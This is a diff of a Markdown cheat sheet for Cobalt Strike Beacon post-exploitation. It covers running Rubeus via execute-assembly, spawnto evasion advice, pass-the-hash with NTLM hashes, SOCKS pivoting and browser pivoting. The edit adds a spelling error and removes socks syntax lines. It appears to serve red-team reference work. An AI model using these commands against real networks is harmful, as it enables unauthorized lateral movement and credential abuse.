@@ -280,7 +280,7 @@ beacon > execute-assembly /home/audit/Rubeus.exe
 
 :warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe 
 
-- **portscan:** Performs a portscan on a specific target.
+- **portscan:** Performs a portscan on a spesific target.
 - **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
 - **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
 :exclamation: This module needs Administrator privileges.
@@ -337,11 +337,6 @@ Opsec safe Pass-the-Hash:
 ```powershell
 # Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.
 beacon > socks [PORT]
-beacon > socks [port]
-beacon > socks [port] [socks4]
-beacon > socks [port] [socks5]
-beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]
-beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]
 
 # Proxy browser traffic through a specified Internet Explorer process.
 beacon > browserpivot [pid] [x86|x64]
